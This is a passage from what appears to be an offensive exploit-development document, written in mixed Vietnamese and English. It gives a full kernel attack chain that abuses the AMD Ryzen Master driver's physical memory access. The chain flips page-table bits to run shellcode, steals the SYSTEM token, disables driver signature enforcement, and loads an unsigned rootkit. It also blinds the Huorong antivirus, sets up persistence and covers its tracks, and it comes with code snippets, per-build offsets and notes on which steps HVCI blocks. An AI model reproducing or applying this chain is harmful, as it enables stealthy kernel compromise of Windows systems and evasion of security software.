// Huorong sysdiag ObCallback: registered via ObRegisterCallbacks
// Callback stored in OBJECT_TYPE.CallbackList
// Path: ObTypeIndexTable → _OBJECT_TYPE → CallbackList → OB_CALLBACK → PreOperation

// Không cần zero tất cả: chỉ cần find sysdiag callback entry và clear PreOperation
// → sysdiag handle-stripping callback disabled
// Process handles dùng OpenProcess(PROCESS_ALL_ACCESS) không bị downgrade nữa
```

---

## 16. PTE Flip — Execute Unsigned Shellcode in Kernel Mode

**Primitive:** Phys R/W để flip XD (NX) bit trong Page Table Entry  
**Mục tiêu:** Map shellcode page rồi call từ kernel context

### 16.1 Tìm PTE của shellcode page

```c
// Allocate shellcode buffer trong user mode (nhưng sẽ execute từ kernel)
// Thực tế hơn: dùng MmAllocateNonCachedMemory → có kernel VA
// Hoặc: flip XD bit của 1 page trong kernel .text (self-modifying)

// Ví dụ: shellcode đặt tại user VA 0x7FF000000000
UINT64 shellcode_va = alloc_shellcode_page();
UINT64 shellcode_pa_from_pte = 0;

// Walk page table để tìm PTE:
UINT64 pml4e_pa = (cr3 & ~0xFFFULL) + ((shellcode_va >> 39 & 0x1FF) << 3);
UINT64 pml4e    = phys_read_qword(pml4e_pa);
UINT64 pdpte_pa = (pml4e & ~0xFFFULL) + ((shellcode_va >> 30 & 0x1FF) << 3);
UINT64 pdpte    = phys_read_qword(pdpte_pa);
UINT64 pde_pa   = (pdpte & ~0xFFFULL) + ((shellcode_va >> 21 & 0x1FF) << 3);
UINT64 pde      = phys_read_qword(pde_pa);
UINT64 pte_pa   = (pde & ~0xFFFULL) + ((shellcode_va >> 12 & 0x1FF) << 3);
UINT64 pte      = phys_read_qword(pte_pa);

// Bit 63 = XD (Execute Disable) — set = no execute
// Bit 2  = U/S (User/Supervisor) — 0 = supervisor only
```

### 16.2 Flip XD bit

```c
UINT64 new_pte = pte & ~(1ULL << 63);  // clear XD bit → executable
// Optionally clear U/S to make it supervisor-only (optional security theater)

phys_write_qword(pte_pa, new_pte);
evict_cache();
// Also need to invalidate TLB:
// → __invlpg(shellcode_va) — only callable from ring-0
// → Alternative: context switch (scheduler flushes TLB on ASID change)
//   Simply Sleep(1) often sufficient for practical exploit
```

### 16.3 Execute từ kernel context

```c
// Dùng APC injection vào kernel thread để call shellcode_va
// Hoặc: overwrite function pointer trong kernel (e.g. timer callback)
//   → phys write vào timer DPC.DeferredRoutine field
//   → next timer tick = call shellcode

// Đơn giản nhất kết hợp với §14 (DSE off):
// Load shellcode dưới dạng unsigned driver → kernel execute trực tiếp
```

---

## 17. Full Attack Chain — AMDRyzenMasterDriverV20 × Huorong Bypass

**Kết hợp:** AMD phys R/W + Huorong sysdiag logic flaws  
**Prerequisite:** Administrator token (AMD SDDL BA only)

```
[T=0] Open driver
      CreateFile("\\.\AMDRyzenMasterDriverV20") → hDrv
      IOCTL 0x81113000 → returns 20 → driver V20 confirmed

[T=1] Resolve kernel layout
      NtQuerySystemInformation(SystemModuleInformation)
      → nt_base, ci_base, cr3 for current process

[T=2] Token theft → SYSTEM token
      §13 chain: walk PML4 → find SYSTEM EPROCESS → copy token
      phys_write → evict_cache
      → Now running as SYSTEM

[T=3] DSE disable
      §14 chain: locate g_CiOptions in ci.dll → phys_write 0
      → g_CiOptions = 0

[T=4] Load unsigned kernel implant
      NtLoadDriver("\\??\C:\ProgramData\implant.sys")
      → DSE disabled → driver loads without signature check
      → implant.sys: e.g. rootkit, direct kernel backdoor

[T=5] Restore g_CiOptions
      phys_write g_ci_pa, 6 → DSE re-enabled
      → Forensically: g_CiOptions value normal, no persistent DSE off

[T=6] Zero Huorong callbacks (via implant.sys from kernel)
      §15 chain: clear PspCreateProcessNotifyRoutine entries
      → sysdiag.sys PsCreate callback removed
      → sysdiag.sys ObCallback removed
      → Huorong now blind to all new process / handle events

[T=7] Persistence (from Huorong-blind state)
      HUORONG_ANALYSIS §26.9 chain:
      → AppInit_DLLs, GPT bootkit — all undetected

[T=8] Cover tracks
      implant.sys: hide own driver from PsLoadedModuleList (DKOM)
      → Driver "unloaded" in task manager view
      → AMDRyzenMasterDriverV20 still running (legitimate)

[RESULT]
  Kernel-mode rootkit loaded, SYSTEM token, Huorong blind, persistence installed.
  ZERO Huorong alerts across entire chain.
  ZERO Windows Defender HVCI bypass (if HVCI enabled → PTE flip fails → use §14 only)
```

---

## 18. HVCI / VBS Compatibility Notes

| Technique | HVCI (on) | HVCI (off) |
|-----------|-----------|-----------|
| Token theft via phys write | ✅ Works — EPROCESS không protected by HVCI | ✅ Works |
| g_CiOptions phys write | ❌ Blocked — HVCI re-enforces DSE in hypervisor | ✅ Works |
| PTE flip (§16) | ❌ Blocked — HVCI uses SLAT, không allow PTE flip | ✅ Works |
| Callback zeroing | ✅ Works — array in normal writeable PA | ✅ Works |
| Load unsigned driver | ❌ Blocked if HVCI on | ✅ via §14 |

**Khi HVCI bật:** Chỉ còn token theft + callback zeroing.  
AMDRyzenMasterDriverV20 phys write vẫn thực hiện được nhưng hypervisor rejects unauthorized page permission changes → PTE flip và DSE disable fail silently hoặc cause #VE.

**Detect HVCI:**
```c
// SystemInformationClass 0xA5 (SystemCodeIntegrityInformation)
SYSTEM_CODEINTEGRITY_INFORMATION ci = {};
NtQuerySystemInformation(0xA5, &ci, sizeof(ci), NULL);
bool hvci_on = (ci.CodeIntegrityOptions & 0x80) != 0;  // CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED
```

---

## 19. Offset Reference (Windows 11 22H2 / 10.0.22621)

| Struct | Field | Offset |
|--------|-------|--------|
| `_EPROCESS` | `DirectoryTableBase` (CR3) | `+0x028` |
| `_EPROCESS` | `UniqueProcessId` | `+0x440` |
| `_EPROCESS` | `ActiveProcessLinks.Flink` | `+0x448` |
| `_EPROCESS` | `Token` (EX_FAST_REF) | `+0x4B8` |
| `_KTHREAD` | `ApcState` | `+0x098` |
| `ntoskrnl` | `PspCreateProcessNotifyRoutine` | scan `.data` — RVA varies per build |
| `ci.dll` | `g_CiOptions` | scan `.data` — verify per build via CiInitialize pattern |

**Verify offsets mỗi OS build:**
```c
// Dùng NtQuerySystemInformation(SystemObjectInformation) hoặc
// windbg: dt nt!_EPROCESS → kiểm tra field offsets
// Hoặc: query PDB via symsrv
```

---

*Exploit chains added: 2026-06-05 | Based on IDA analysis + phys R/W primitives from §7*
